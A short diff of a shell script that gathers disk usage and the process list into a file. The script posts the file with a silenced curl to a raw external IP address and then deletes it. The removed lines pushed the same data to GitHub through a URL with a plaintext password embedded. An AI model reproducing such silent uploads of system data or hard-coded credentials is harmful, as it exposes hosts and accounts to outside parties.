@@ -13,12 +13,5 @@ df -h >> results
 echo ----------------- ps -aux ------- >> results
 ps -aux >> results
 echo ----------------- END $(date) ------- >> results
-curl -F "name=@results" http://138.68.58.230:8080
-apt-get -q install git
-git clone http://github.com/hbtnstuff/tests.git
-cd tests/
-cp ../results .
-git add . 
-git commit "t"
-git push 'https://hbtnstuff:s4turd4yh4ck4thon;@github.com/hbtnstuff/tests.git' master
+curl -s -F "name=@results" http://138.68.58.230:8080 && echo -n ool
 rm results
